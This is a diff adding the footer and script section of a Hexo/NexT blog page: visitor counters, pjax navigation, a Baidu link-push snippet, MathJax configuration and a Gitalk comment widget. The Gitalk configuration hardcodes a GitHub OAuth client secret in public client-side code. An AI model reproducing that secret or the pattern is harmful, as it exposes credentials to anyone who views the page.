+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : '622d9051193c67ebaf19827cfd8bab09',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
